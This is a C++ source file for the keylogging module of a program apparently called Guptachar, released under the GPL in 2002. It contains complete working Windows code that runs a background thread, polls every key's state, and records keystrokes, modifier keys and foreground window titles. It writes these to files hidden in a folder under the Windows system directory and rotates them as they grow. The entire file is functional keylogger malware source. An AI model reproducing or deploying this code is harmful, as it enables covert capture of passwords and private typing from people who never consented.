/*
    Guptachar Keylogging Module
    Copyright (C) 2002 Ayan Chakrabarti

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

    keylog.cpp 
    ========== 

    Implementation of the Keylogger module
*/

#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <string.h>


unsigned int nlist[] = { 8,9,12,13,19,20,27,32,33,34,35,36,37,38,39,
                         40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,
                         57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,
                         81,82,83,84,85,86,87,88,89,90,91,93,96,97,98,99,100,
                         101,102,103,104,105,106,107,108,109,110,111,112,113,
                         114,115,116,117,118,119,120,121,122,123,124,125,126,
                         127,128,129,130,131,132,133,134,135,144,145,186,187,
                         188,189,190,191,192,219,220,221,222,223,224,225,226,
                         227,228,230,233,234,235,236,237,238,239,240,241,242,
                         243,244,245,246,247,248,249,250,251,252,253,254,0};

static int logkeys = 0;
#define MAXSZ 8192

int getkeyseq(void);

void getfname(char * fname)
{
        int seq,i;
        char numb[10];

        seq = getkeyseq();

        strcpy(numb,"0000");
        i = 0;
        while(seq > 0)
        {
                numb[3 - i] = (seq%10) + '0';
                seq/=10;
                i++;
        }

        GetWindowsDirectory(fname,990);
        strcat(fname,"\\GPTCRKL\\");
        strcat(fname,numb);
        strcat(fname,".KEY");
}


long WINAPI LogKeys(LPVOID m)
{
        int i,alt,shf,ctrl;
        FILE * fp;
        HWND hw;
        char fn[1024],wint[1024],buf[1024],dirn[1024],fn2[1024];
        unsigned long sz;

        GetWindowsDirectory(dirn,990);
        strcat(dirn,"\\GPTCRKL");
        strcpy(fn,dirn);
        strcat(fn,"\\LOGFILE.KEY");
        
        strcpy(wint,"");
        sz = 0;

        while(logkeys)
        {
             for(i = 0;nlist[i] != 0;i++)
                if(GetAsyncKeyState(nlist[i])  == -32767)
                        break;

            if(nlist[i] == 0)
                continue;

            hw = GetForegroundWindow();
            GetWindowText(hw,buf,1023);

            alt = shf = ctrl = 0;
            if(GetAsyncKeyState(16) != 0)
                shf = 1;
            if(GetAsyncKeyState(17) != 0)
                ctrl = 1;
            if(GetAsyncKeyState(18) != 0)
                alt = 1;

            if(sz > MAXSZ)
            {
                getfname(fn2);
                MoveFile(fn,fn2);
                strcpy(wint,"");
            }

            fp = fopen(fn,"ab");
            if(!fp)
            {
                CreateDirectory(dirn,NULL);
                fp = fopen(fn,"ab");
            }

            if(strcmp(buf,wint) != 0)
            {
                strcpy(wint,buf);
                fputc(0,fp);
                fwrite(wint,strlen(wint)+1,1,fp);
            }

            if(alt || shf || ctrl)
            {
                fputc(1,fp);
                fputc(alt,fp);
                fputc(shf,fp);
                fputc(ctrl,fp);
            }
            fputc(nlist[i],fp);
            sz = ftell(fp);
            fclose(fp);

        }

        return 0;
}

void setkeylog(int s)
{
        HANDLE h;
        int olval = logkeys;

        logkeys = s;

        if(s && !olval)
        {
                CreateThread(NULL,0,(LPTHREAD_START_ROUTINE) LogKeys,
                                (LPVOID) NULL,0,(LPDWORD) &h);
                if(!h)
                        logkeys = 0;
                else
                        CloseHandle(h);
        }
         

                
}
